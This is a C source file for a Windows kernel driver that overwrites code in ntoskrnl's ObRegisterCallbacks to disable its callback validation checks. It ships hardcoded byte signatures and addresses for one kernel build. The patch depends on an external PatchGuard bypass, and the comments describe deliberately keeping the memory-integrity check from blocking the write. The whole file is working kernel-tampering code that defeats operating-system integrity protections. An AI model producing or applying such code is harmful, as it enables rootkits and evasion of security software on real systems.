#include "ObGatePatch.h"
#include "Bypass.h"
#include "KernelWrite.h"

//
// Verified against VM_Logs\ntoskrnl.exe 10.0.26100.4351 (SHA-256
// EB3AFF3F0C7D210E31DC8DA896493B2F74DBAFE8EBF2C10B0600E33CB3139AA2),
// ObRegisterCallbacks at RVA 0x9efc40.
//
#define OB_CALLBACKS_PRE_RVA  0x9efd60
#define OB_CALLBACKS_POST_RVA 0x9efd77
#define GATE_PATCH_LEN 14

//
// 0x1409efd60  BA 20 00 00 00        mov edx, 0x20
//             E8 CA C1 B0 FF        call 0x1404fbf34
//             85 C0                 test eax, eax
//             74 6F                 jz  0x1409efddd
//
// 0x1409efd77  BA 20 00 00 00        mov edx, 0x20
//             E8 B3 C1 B0 FF        call 0x1404fbf34
//             85 C0                 test eax, eax
//             74 58                 jz  0x1409efddd
//
// Both become an unconditional jump to the next valid entry in the same block
// (skipping the validation and its deny branch), then padding. The jz target
// sits at +0x0D, so the replacement is EB 0C plus 12 NOPs.
//
static const UCHAR kPreOriginal[GATE_PATCH_LEN] = {
    0xBA, 0x20, 0x00, 0x00, 0x00, 0xE8, 0xCA, 0xC1,
    0xB0, 0xFF, 0x85, 0xC0, 0x74, 0x6F
};
static const UCHAR kPostOriginal[GATE_PATCH_LEN] = {
    0xBA, 0x20, 0x00, 0x00, 0x00, 0xE8, 0xB3, 0xC1,
    0xB0, 0xFF, 0x85, 0xC0, 0x74, 0x58
};
static const UCHAR kGatePatched[GATE_PATCH_LEN] = {
    0xEB, 0x0C, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

static UCHAR g_PreSaved[GATE_PATCH_LEN];
static UCHAR g_PostSaved[GATE_PATCH_LEN];
static BOOLEAN g_PreSavedOk;
static BOOLEAN g_PostSavedOk;
static BOOLEAN g_Applied;
static BOOLEAN g_RestoredAny;

#define SYSTEM_CODE_INTEGRITY_INFORMATION_CLASS 103

typedef struct _CI_POLICY_OPTIONS {
  ULONG Boot;
  ULONG Runtime;
  ULONG SecureBoot;
  ULONG CodeIntegrity;
  ULONG CodeIntegrityHeader;
  ULONG CodeIntegritySomedx;
} CI_POLICY_OPTIONS;

typedef struct _SYSTEM_CODE_INTEGRITY_INFORMATION {
  ULONG Length;
  ULONG CodeIntegrityOptions;
  ULONG CodeIntegrityCatalogOptions;
  ULONG CodeIntegrityCatalogVersion;
  ULONG CodeIntegrityCatalogTimestamp;
  UCHAR CodeIntegrityPolicyEnforcementStatus;
  UCHAR CodeIntegrityPolicyEnforcementUpdates;
  UCHAR CodeIntegrityPolicyInEnforcementModeSystem;
  UCHAR CodeIntegrityPolicyInEnforcementModeUser;
  CI_POLICY_OPTIONS Options;
} SYSTEM_CODE_INTEGRITY_INFORMATION;

typedef NTSTATUS(NTAPI *PFN_NT_QUERY_SYSTEM_INFORMATION)(
    ULONG SystemInformationClass, PVOID SystemInformation, ULONG Length,
    PULONG ReturnLength);

//
// Memory integrity (HVCI / kernel-mode code integrity) decides whether this
// driver may write ntoskrnl's .text at all. It says nothing about the
// ObRegisterCallbacks gate, which is pure software policy inside ntoskrnl, so
// this is advisory only.
//
// It deliberately does not veto the patch. This query returns
// STATUS_ACCESS_VIOLATION on the 26100.4351 VM, and treating any failure as
// "enforced" made this check refuse the very patch it exists to protect.
// Enforcement is not guessed at: if it is on, the write faults and WriteBytes
// catches it, which reaches the safe outcome by trying instead of predicting.
//
static VOID LogHvciState(VOID) {
  SYSTEM_CODE_INTEGRITY_INFORMATION info;
  PFN_NT_QUERY_SYSTEM_INFORMATION query;
  UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
  ULONG returned = 0;
  NTSTATUS status;

  query = (PFN_NT_QUERY_SYSTEM_INFORMATION)MmGetSystemRoutineAddress(
      &routineName);
  if (query == NULL) {
    DbgPrint("[LongsDriver] ObGatePatch: NtQuerySystemInformation "
             "unavailable (advisory, continuing).\n");
    return;
  }

  RtlZeroMemory(&info, sizeof(info));
  info.Length = sizeof(info);

  status = query(SYSTEM_CODE_INTEGRITY_INFORMATION_CLASS, &info, sizeof(info),
                 &returned);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] ObGatePatch: code integrity query returned 0x%X"
             " (advisory, continuing).\n",
             status);
    return;
  }

  DbgPrint("[LongsDriver] ObGatePatch: memory integrity enforcement status=%u"
           " opts=0x%X systemMode=%u\n",
           info.CodeIntegrityPolicyEnforcementStatus, info.CodeIntegrityOptions,
           info.CodeIntegrityPolicyInEnforcementModeSystem);
}

static VOID LogActual(const char *Label, const UCHAR *Bytes) {
  DbgPrint("[LongsDriver] ObGatePatch: %s signature mismatch, actual: ",
           Label);
  for (ULONG i = 0; i < GATE_PATCH_LEN; i++) {
    DbgPrint("%02X ", Bytes[i]);
  }
  DbgPrint("\n");
}

//
// Returns TRUE when the bytes at Address are either the expected original or
// an already-installed patch. OutActual receives the bytes that were found.
// OutRestorable distinguishes the two: it is TRUE only when OutActual holds
// the real original, meaning a revert can put the kernel back. An adopted
// patch carries no original, so it must be reported as not restorable rather
// than having the patch written back over itself.
//
static BOOLEAN ReadAndMatch(ULONGLONG Address, const UCHAR *Expected,
                            const char *Label, UCHAR *OutActual,
                            BOOLEAN *OutRestorable) {
  UCHAR expectedCopy[GATE_PATCH_LEN];

  *OutRestorable = FALSE;

  //
  // The address is derived from the loader-reported image base plus a fixed
  // RVA, so a wrong base or a stale RVA lands on unmapped memory. Trapping the
  // read turns that into a diagnosable refusal instead of a bugcheck.
  //
  __try {
    RtlCopyMemory(OutActual, (PVOID)Address, GATE_PATCH_LEN);
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    DbgPrint("[LongsDriver] ObGatePatch: read at 0x%X faulted, code 0x%X"
             " (bad image base or stale RVA).\n",
             Address, GetExceptionCode());
    return FALSE;
  }

  if (RtlCompareMemory(OutActual, Expected, GATE_PATCH_LEN) ==
      GATE_PATCH_LEN) {
    *OutRestorable = TRUE;
    return TRUE;
  }

  //
  // If the bytes are already the patch, a previous load applied it and its
  // cleanup never ran. The original bytes are gone, so this cannot be counted
  // as a saved original. OutActual is left holding the patch, which is what
  // was actually found, and the caller records that the site is unrestorable.
  //
  if (RtlCompareMemory(OutActual, kGatePatched, GATE_PATCH_LEN) ==
      GATE_PATCH_LEN) {
    DbgPrint("[LongsDriver] ObGatePatch: %s already patched from a previous "
             "load, adopting it; the original bytes are gone so this site "
             "cannot be reverted.\n",
             Label);
    return TRUE;
  }

  RtlCopyMemory(expectedCopy, Expected, GATE_PATCH_LEN);
  DbgPrint("[LongsDriver] ObGatePatch: %s at 0x%X did not match.\n", Label,
           Address);
  LogActual("actual  ", OutActual);
  LogActual("expected", expectedCopy);
  return FALSE;
}

//
// If memory integrity is enforced the copy raises an exception rather than
// silently doing nothing, so trap it and report instead of bugchecking. This is
// the real enforcement test; the policy query above is only a diagnostic.
//
static NTSTATUS WriteBytes(ULONGLONG Address, const UCHAR *Bytes) {
  __try {
    return KernelWrite((PVOID)Address, (PVOID)Bytes, GATE_PATCH_LEN);
  } __except (EXCEPTION_EXECUTE_HANDLER) {
    DbgPrint("[LongsDriver] ObGatePatch: write to 0x%X faulted, code 0x%X"
             " (memory integrity is enforcing).\n",
             Address, GetExceptionCode());
    return STATUS_ACCESS_VIOLATION;
  }
}

NTSTATUS ObGatePatchApply(VOID) {
  PVOID kernelBase = NULL;
  ULONG kernelSize = 0;
  ULONGLONG preAddr;
  ULONGLONG postAddr;
  BOOLEAN preRestorable;
  BOOLEAN postRestorable;
  NTSTATUS status;

  DbgPrint("[LongsDriver] ObGatePatch: apply requested, target ntoskrnl "
           "10.0.26100.4351 (RVA 0x%X / 0x%X).\n",
           OB_CALLBACKS_PRE_RVA, OB_CALLBACKS_POST_RVA);

  if (g_Applied) {
    return STATUS_SUCCESS;
  }

  if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
    DbgPrint("[LongsDriver] ObGatePatch: must run at PASSIVE_LEVEL.\n");
    return STATUS_INVALID_DEVICE_STATE;
  }

  //
  // Mutating ntoskrnl code is a PatchGuard trigger. Without the bypass the
  // system will bugcheck a few seconds later, so refuse up front.
  //
  if (!g_PatchGuardBypassed) {
    DbgPrint("[LongsDriver] ObGatePatch: PatchGuard bypass inactive, "
             "refusing to patch.\n");
    return STATUS_DEVICE_CONFIGURATION_ERROR;
  }

  LogHvciState();

  if (!BypassGetKernelBaseNSize(&kernelBase, &kernelSize)) {
    DbgPrint("[LongsDriver] ObGatePatch: could not locate ntoskrnl.\n");
    return STATUS_NOT_FOUND;
  }

  preAddr = (ULONGLONG)kernelBase + OB_CALLBACKS_PRE_RVA;
  postAddr = (ULONGLONG)kernelBase + OB_CALLBACKS_POST_RVA;

  //
  // Both sites must be inside the kernel image, and inside .text rather than a
  // trailing data region, otherwise the RVAs are stale for this build.
  //
  if ((OB_CALLBACKS_POST_RVA + GATE_PATCH_LEN) > kernelSize) {
    DbgPrint("[LongsDriver] ObGatePatch: target RVA outside ntoskrnl "
             "(size 0x%X).\n",
             kernelSize);
    return STATUS_INVALID_PARAMETER;
  }

  if (!ReadAndMatch(preAddr, kPreOriginal, "PreOperation", g_PreSaved,
                    &preRestorable)) {
    return STATUS_REVISION_MISMATCH;
  }
  g_PreSavedOk = preRestorable;

  if (!ReadAndMatch(postAddr, kPostOriginal, "PostOperation", g_PostSaved,
                    &postRestorable)) {
    return STATUS_REVISION_MISMATCH;
  }
  g_PostSavedOk = postRestorable;

  //
  // All-or-nothing: if the second write fails, put the first one back so we
  // never leave ObRegisterCallbacks half patched.
  //
  status = WriteBytes(preAddr, kGatePatched);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] ObGatePatch: PreOperation write failed 0x%X.\n",
             status);
    if (g_PreSavedOk) {
      (VOID)WriteBytes(preAddr, g_PreSaved);
    }
    return status;
  }

  status = WriteBytes(postAddr, kGatePatched);
  if (!NT_SUCCESS(status)) {
    DbgPrint("[LongsDriver] ObGatePatch: PostOperation write failed 0x%X, "
             "rolling back.\n",
             status);
    if (g_PostSavedOk) {
      (VOID)WriteBytes(postAddr, g_PostSaved);
    }
    if (g_PreSavedOk) {
      (VOID)WriteBytes(preAddr, g_PreSaved);
    }
    return status;
  }

  g_Applied = TRUE;
  DbgPrint("[LongsDriver] ObGatePatch: OB callback validation relaxed at "
           "ntoskrnl+0x%X and +0x%X.\n",
           OB_CALLBACKS_PRE_RVA, OB_CALLBACKS_POST_RVA);
  return STATUS_SUCCESS;
}

VOID ObGatePatchRevert(VOID) {
  PVOID kernelBase = NULL;
  ULONG kernelSize = 0;

  g_RestoredAny = FALSE;

  if (!g_Applied) {
    return;
  }

  if (!BypassGetKernelBaseNSize(&kernelBase, &kernelSize) ||
      (OB_CALLBACKS_POST_RVA + GATE_PATCH_LEN) > kernelSize) {
    //
    // Without the image base there is nowhere to write the originals back.
    // Leaving the patch in place is the lesser failure here: the gate stays
    // relaxed but the callback itself is still valid, whereas restoring into
    // an unknown address would be fatal.
    //
    DbgPrint("[LongsDriver] ObGatePatch: cannot locate ntoskrnl during "
             "revert, patch left in place.\n");
    return;
  }

  if (g_PostSavedOk) {
    (VOID)WriteBytes((ULONGLONG)kernelBase + OB_CALLBACKS_POST_RVA, g_PostSaved);
    g_PostSavedOk = FALSE;
    g_RestoredAny = TRUE;
  }
  if (g_PreSavedOk) {
    (VOID)WriteBytes((ULONGLONG)kernelBase + OB_CALLBACKS_PRE_RVA, g_PreSaved);
    g_PreSavedOk = FALSE;
    g_RestoredAny = TRUE;
  }

  g_Applied = FALSE;

  //
  // Only claim a restore when something was actually written back. A site that
  // was adopted from a previous load has no original, so a silent "restored"
  // here would hide a kernel left permanently patched.
  //
  if (g_RestoredAny) {
    DbgPrint("[LongsDriver] ObGatePatch: original ObRegisterCallbacks bytes "
             "restored.\n");
  } else {
    DbgPrint("[LongsDriver] ObGatePatch: revert ran but no original bytes were"
             " ever saved (patch adopted from a previous load); ntoskrnl stays"
             " patched until reboot.\n");
  }
}

BOOLEAN ObGatePatchIsApplied(VOID) { return g_Applied; }
